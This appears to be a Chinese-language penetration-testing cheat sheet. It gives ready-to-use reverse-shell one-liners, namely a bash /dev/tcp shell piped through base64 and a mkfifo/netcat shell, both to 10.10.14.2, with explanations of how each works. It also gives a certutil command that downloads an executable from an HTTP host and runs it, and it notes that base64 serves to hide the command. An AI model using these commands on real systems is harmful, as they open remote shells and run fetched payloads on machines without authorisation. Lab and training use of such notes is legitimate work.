```
echo "bash -i  >& /dev/tcp/10.10.14.2/9001 0>&1  " | base64
```
### 原理

1. `bash -i >& /dev/tcp/10.10.14.2/5555 0>&1`
    
    - 利用 Bash 内置的 **/dev/tcp** 功能打开一个 TCP 连接
        
    - 将 stdin/stdout/stderr 直接绑定到这个连接，实现交互式 shell
        
2. `| base64`
    
    - 只是把命令字符串 **编码成 base64**，本身不执行
        
    - 解码后需要用 `bash -c "$(echo ... | base64 -d)"` 才能执行
        

⚡ 总结：利用 bash 内置 TCP 功能建立 shell，base64 只是编码/隐藏命令。



```
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.2 5555 > /tmp/f 
```
### 原理

1. `rm /tmp/f; mkfifo /tmp/f`  
    删除已有的 `/tmp/f` 文件，然后创建一个 **命名管道**（FIFO）。命名管道可以让两个进程通过文件交换数据。
    
2. `cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.2 5555 > /tmp/f`  
    数据流如下：
    
    - `cat /tmp/f` 从命名管道读数据
        
    - 输出给 `/bin/sh -i`，启动一个 **交互式 shell**
        
    - `2>&1` 将标准错误重定向到标准输出
        
    - 通过 `nc`（netcat）发送到远程 IP/端口
        
    - `> /tmp/f` 把远程的数据写回 FIFO，实现 stdin/stdout 的循环
        

⚡ 总结：通过 FIFO + netcat 建立一个远程交互 shell。



```
certutil -f -urlcache -split \"http://192.168.49.60:8082/WebIIS.exe\" \"C:\\Windows\\Temp\\WebIIS.exe\" && C:\\Windows\\Temp\\WebIIS.exe
```
```
certutil -f -urlcache -split "http://192.168.49.60:8082/WebIIS.exe" "C:\Windows\Temp\WebIIS.exe" && C:\Windows\Temp\WebIIS.exe
```
